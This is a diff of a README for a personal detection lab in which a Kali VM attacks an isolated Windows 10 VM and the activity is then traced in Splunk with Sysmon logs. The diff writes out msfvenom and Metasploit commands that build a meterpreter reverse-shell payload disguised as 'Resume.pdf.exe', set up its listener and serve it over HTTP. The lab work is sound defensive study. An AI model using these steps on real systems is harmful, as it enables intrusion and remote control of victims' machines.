@@ -1,7 +1,5 @@
 # Detection Lab
-
 ## Project Overview
-
 I built this home lab to create a virtual environment for practicing penetration testing and security monitoring techniques within a Security Information and Event Management (SIEM) system. The main objective of this project is to simulate an attack scenario and conduct log analysis to identify Indicators of Compromise (IoCs). This project was fabricated to strengthen my knowledge of security concepts by acquiring hands-on experience constructing and deploying malware, analyzing logs, and increase familiarity with commonly used industry tools.
 
 **Project Objectives:**
@@ -24,15 +22,12 @@ I built this home lab to create a virtual environment for practicing penetration
 - Splunk
 
 ## Lab Architecture
-
 I fabricated and designed a segmented virtual network where the VMs could communicate with each other but remain isolated from the host network.
 <img src="https://i.imgur.com/KKj42hs.png[/img]"/>
 <img src="https://i.imgur.com/XLy7Ftz.png[/img]"/>
 <img src="https://i.imgur.com/Rqj6jGq.png[/img]"/>
 
-![Lab Architecture]([https://i.imgur.com/PLACEHOLDER.png]
-
-### Network Topology Implemented
+### Network Topology
 ```
 ┌─────────────────┐    ┌─────────────────┐
 │   Kali Linux    │    │   Windows 10    │
@@ -45,247 +40,136 @@ I fabricated and designed a segmented virtual network where the VMs could commun
               (No Internet Access)
 ```
 
-## Hardware & Software Used
-
-### Host System Specifications
-- **CPU:** Multi-core processor with virtualization support (Intel VT-x or AMD-V)
-- **RAM:** Minimum 16GB (32GB recommended)
-- **Storage:** 200GB+ free space for VMs
-- **Hypervisor:** Microsoft Hyper-V
-
-### Virtual Machines Deployed
-| VM | OS | RAM | Storage | Purpose |
-|----|----|-----|---------|---------|
-| Attacker | Kali Linux | 4GB | 40GB | Penetration testing platform |
-| Target | Windows 10 | 8GB | 60GB | Victim system with logging |
-
-### Software Stack Implemented
-- **Kali Linux:** Pre-installed penetration testing tools
-- **Windows 10:** Target operating system
-- **Splunk Enterprise:** Log collection and analysis
-- **Sysmon:** Enhanced Windows event logging
-- **Metasploit Framework:** Exploitation toolkit
-
-## Virtual Machine Configuration
-
-### Hyper-V Implementation
-I configured Hyper-V with an isolated virtual switch to prevent lab traffic from reaching the production network.
-
-![Hyper-V Setup](https://i.imgur.com/PLACEHOLDER.png)
-
 ### Kali Linux Attack Platform
-I deployed Kali Linux with all penetration testing tools pre-configured.
+I deployed Kali Linux VM and assigned a static IP of 10.10.10.1
 
-**My Configuration:**
-- Assigned IP: 10.10.10.1
-- Enabled SSH for remote access
-- Updated all tool repositories
-
-```bash
-# Commands I executed to update Kali Linux
-sudo apt update && sudo apt upgrade -y
-
-# Verified Metasploit installation
-msfconsole --version
-```
-
-![Kali Linux Setup](https://i.imgur.com/PLACEHOLDER.png)
+<img src="https://i.imgur.com/RArGpWn.png[/img]"/>
 
 ### Windows Target Preparation
-I set up the Windows 10 machine with deliberate security weaknesses for realistic testing.
+The Windows 10 machine was assigned a static IP of 10.10.10.2 and configured with deliberate security weaknesses for testing.
 
-**Security Modifications I Made:**
+<img src="https://i.imgur.com/vrHuQ0a.png[/img]"/>
+
+**Security Modifications Made:**
 - Disabled Windows Defender
 - Opened RDP port 3389
-- Installed Sysmon for enhanced logging
-- Configured necessary firewall exceptions
 
-![Windows VM Setup](https://i.imgur.com/PLACEHOLDER.png)
-
-## Network Implementation
-
-### IP Address Configuration
-I assigned the following static IP addresses:
-- **Kali Linux (Attacker):** 10.10.10.1/24
-- **Windows (Target):** 10.10.10.2/24
-
-### Network Isolation Strategy
-I configured the VMs on an isolated virtual switch to ensure:
-- No accidental exposure to production network
-- Controlled environment without internet access
-- Complete isolation from host system
-
-![Network Configuration](https://i.imgur.com/PLACEHOLDER.png)
+<img src="https://i.imgur.com/yjUuZCu.png[/img]"/>
+<img src="https://i.imgur.com/Ea2emFC.png[/img]"/>
 
 ## Splunk Setup
-
-### Splunk Enterprise Installation
-I installed Splunk Enterprise on the Windows target machine for comprehensive log analysis.
-
 ### Sysmon Integration
-I configured Splunk to ingest Sysmon logs for detailed process monitoring capabilities.
+I configured Splunk to ingest Sysmon logs by altering the "inputs.conf" located in the file path: C:\Program Files\Splunk\etc\system\local
 
-**inputs.conf Configuration I Implemented:**
-```ini
-[WinEventLog://Microsoft-Windows-Sysmon/Operational]
-disabled = false
-index = endpoint
-```
+<img src="https://i.imgur.com/Ac1pwDe.png[/img]"/>
+
+**inputs.conf Configuration Settings added:**
+<img src="https://i.imgur.com/hoY4mYQ.png[/img]"/>
 
 ### Index Creation
-I created a dedicated "endpoint" index specifically for organizing security event logs.
+Next an index titled "endpoint" was created in Splunk to parse the generated Sysmon logs.
 
-![Splunk Configuration](https://i.imgur.com/PLACEHOLDER.png)
+<img src="https://i.imgur.com/i9tCxxo.png[/img]"/>
 
 ## Attack Execution
-
 ### Target Reconnaissance
-I performed network scanning to identify the target system and enumerate open ports.
+A Nmap scan was then conducted to enumerate the target system. This scan showed the target system is operating a Window's OS with port 3389 (RDP) open.
 
-```bash
-# Nmap scan I conducted to identify target OS and open ports
-nmap -A 10.10.10.2 -Pn
-```
-
-**My Reconnaissance Results:**
-- Successfully identified Windows OS
-- Discovered open RDP port (3389)
-- Confirmed network connectivity between VMs
-
-![Nmap Scan Results](https://i.imgur.com/PLACEHOLDER.png)
+<img src="https://i.imgur.com/2Y9T7Uv.png[/img]"/>
 
 ### Malware Creation
-I generated a reverse shell payload using Metasploit's msfvenom tool.
+To create the payload, I began by running the command "msfvenom -l payloads" to show a list of payload options.
 
-```bash
-# Commands I used to create the malware
-# First, I listed available payloads
-msfvenom -l payloads | grep windows
+<img src="https://i.imgur.com/Zziosz5.png[/img]"/>
 
-# Then generated the reverse TCP payload
-msfvenom -p windows/x64/meterpreter_reverse_tcp \
-         lhost=10.10.10.1 lport=4444 \
-         -f exe -o Resume.pdf.exe
-```
+With the payload now identified, the command "msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.10.1 lport=4444 -f exe -o Resume.pdf.exe". This command creates the malware and instructs it to connect to our attacker system at 10.10.10.1 on port:4444. This file is also assigned the ".exe" file type and saved under the name "Resume.pdf.exe".
 
-![Malware Generation](https://i.imgur.com/PLACEHOLDER.png)
+<img src="https://i.imgur.com/UlCNlkq.png[/img]"/>
 
 ### Listener Configuration
-I set up a Metasploit listener to catch incoming connections from the target machine.
+Now that the malware is created, a listener was configured to monitor the port specified in the malware for incoming connections. I began by running the command "msfconsole", opening Metasploit Framework. 
 
-```bash
-# My listener setup process
-msfconsole
+<img src="https://i.imgur.com/sBct5y8.png[/img]"/>
 
-# Configured multi/handler
-use exploit/multi/handler
-set payload windows/x64/meterpreter_reverse_tcp
-set lhost 10.10.10.1
-set lport 4444
-exploit
-```
+Following the launch of Metasploit Framework, the command "use exploit/multi/handler" was ran followed by the command "options" to begin configuring the listener for the payload. The listener was then configured changing the "Payload options" with the command "set payload windows/x64/meterpreter_reverse_tcp" and the "LHOST" with "set lhost 10.10.10.1". After verifying the listener is configured correctly with the "options" command, the listener was deployed using "exploit".
 
-![Metasploit Listener](https://i.imgur.com/PLACEHOLDER.png)
+<img src="https://i.imgur.com/2U6NXEr.png[/img]"/>
+<img src="https://i.imgur.com/3kEZUlN.png[/img]"/>
 
 ### Payload Delivery
-I created a simple HTTP server to deliver the malware to the target system.
+For payload delivery, a http server was created by executing the command "python3 -m http.server 9999".
 
-```bash
-# Python HTTP server I created for payload delivery
-python3 -m http.server 9999
-```
+<img src="https://i.imgur.com/HtWk9d7.png[/img]"/>
 
 ### Target Compromise
-I executed the complete attack sequence on the Windows target machine.
+I then switch back to target machine, navigate to the attacker's web server at 10.10.10.1:9999, download and execute the malware, and verify that a connection to the attacker system was established by performing the command "netstat -anob".
 
-**My Attack Process:**
-1. Navigated to attacker's web server (10.10.10.1:9999)
-2. Downloaded and executed "Resume.pdf.exe"
-3. Verified successful connection establishment
-
-![Payload Execution](https://i.imgur.com/PLACEHOLDER.png)
+<img src="https://i.imgur.com/5VaDDgb.png[/img]"/>
+<img src="https://i.imgur.com/7a13j0N.png[/img]"/>
 
 ### Post-Exploitation Activities
-I demonstrated system access through the established reverse shell connection.
+Moving back to the attacker system, I noticed a connection had been established with our target system. 
 
-```bash
-# Commands I executed on the compromised system
-net user
-net localgroup
-ipconfig
-```
+<img src="https://i.imgur.com/WuYXtFI.png[/img]"/>
 
-![Post-Exploitation](https://i.imgur.com/PLACEHOLDER.png)
+From here, I established a shell by running the command "shell" on the attacker machine and begin running the commands "net user", "net localgroup", and "ipconfig".
+
+<img src="https://i.imgur.com/dndxxCs.png[/img]"/>
+<img src="https://i.imgur.com/4GD503Z.png[/img]"/>
 
 ## Log Analysis Results
-
 ### Initial Investigation
-I searched for suspicious network connections in Splunk to identify attack indicators.
+Pivoting back to the target system, I connect to Splunk and searched "index=endpoint [Kali VM IP]" to see what data is available.
 
-```spl
-index=endpoint [Kali VM IP Address]
-```
+<img src="https://i.imgur.com/75l8eQD.png[/img]"/>
 
-**What I Discovered:**
-- Connections to ports 3389 and 4444
-- Suspicious external IP communications
-- Clear evidence of unauthorized network activity
+The results showed that two destination ports were targeted, port 3389 and port 4444. These findings raise important questions such as:
+- “Should this machine be attempting a connection to these ports?”
+- “What machine is this?”
+- “Why was a connection attempt made?”
 
-![Splunk Search Results](https://i.imgur.com/PLACEHOLDER.png)
+<img src="https://i.imgur.com/DFMJkVM.png[/img]"/>
 
 ### Malware Behavior Analysis
-I investigated the malicious executable's behavior patterns in the logs.
+After replacing the Kali Linux IP in the search bar with the malware file name, we can see that 15 "Events" were generated.
 
-```spl
-index=endpoint "Resume.pdf.exe"
-```
+<img src="https://i.imgur.com/fwysgoV.png[/img]"/>
 
-**My Analysis Results:**
-- 15 security events generated by the malware
-- Multiple process creation events (EventCode 1)
-- Clear correlation between file execution and system activity
+I open the "EventCode" field, select the entry with a "value" of 1 and expand the results.
 
-![Malware Events](https://i.imgur.com/PLACEHOLDER.png)
+<img src="https://i.imgur.com/k9TBI07.png[/img]"/>
+
+Scrolling down, I see that the malware spawned the process "C:\Windows\system32\cmd.exe" with the process_id "1996"
+
+<img src="https://i.imgur.com/IYtgurk.png[/img]"/>
 
 ### Process Execution Tracking
-I traced the malware's complete process execution chain using Splunk queries.
+I then copied the process_guid and created a new search "index=endpoint [process_guid]" and altered the results to only show the fields "Time, ParentImage, Image, and CommandLine". From here I saw the process "C:\Windows\system32\cmd.exe" ran the commands "net user, net localgroup, and ipconfig".
 
-```spl
-index=endpoint [process_guid]
-| table _time, ParentImage, Image, CommandLine
-```
+<img src="https://i.imgur.com/3ZshUUU.png[/img]"/>
 
 **Key Discoveries I Made:**
 - Malware successfully spawned cmd.exe (PID 1996)
 - Executed reconnaissance commands as expected
 - Established clear attack timeline and process relationships
 
-![Process Analysis](https://i.imgur.com/PLACEHOLDER.png)
-
 ## Project Findings
+### Attack Indicators Identified
+- **Network:** Unexpected connections to port 4444
+- **Process:** Suspicious cmd.exe execution patterns
+- **Command Line:** System reconnaissance actions detected
 
-### Attack Indicators I Identified
-- **Network Anomalies:** Unexpected connections to port 4444
-- **Process Anomalies:** Suspicious cmd.exe execution patterns
-- **Command Execution:** System reconnaissance activities detected
-
-## Project Insights
-
+## Lessons Learned
 ### What Worked Well
 - **Effective Isolation:** VM network segmentation successfully prevented host exposure
 - **Comprehensive Logging:** Sysmon provided detailed attack visibility and forensic data
 
-### Technical Challenges I Overcame
-- **Resource Management:** Successfully balanced VM performance with host system resources
-- **Log Volume:** Effectively managed high-volume security event data
-- **Network Timing:** Ensured proper communication between isolated VMs
+### Technical Challenges Overcame
+- **Resource Management:** Balanced VM requirements with host system resources, prioritizing system performance.
+- **Log Volume:** Effectively worked with a high number of security events.
+- **Network Timing:** Ensured proper communication between virtual machine environments
 
-## Future Work
+## Planned Future Implementions
+- **Active Directory Environment:** Expand the Windows environment by implementing a fully-functioning Active Directory domain.
+- **Automated Analysis:** Customize Splunk's dashboard to automate alert generation.
 
-### Advanced Capabilities I Plan to Implement
-- **Active Directory Environment:** Multi-machine domain simulation
-- **Automated Analysis:** Custom Splunk dashboards and alert development
-
-### Skills I Want to Develop Further
-- **Malware Development:** Custom payload creation techniques
-- **Forensics Analysis:** Memory and disk forensics methodologies
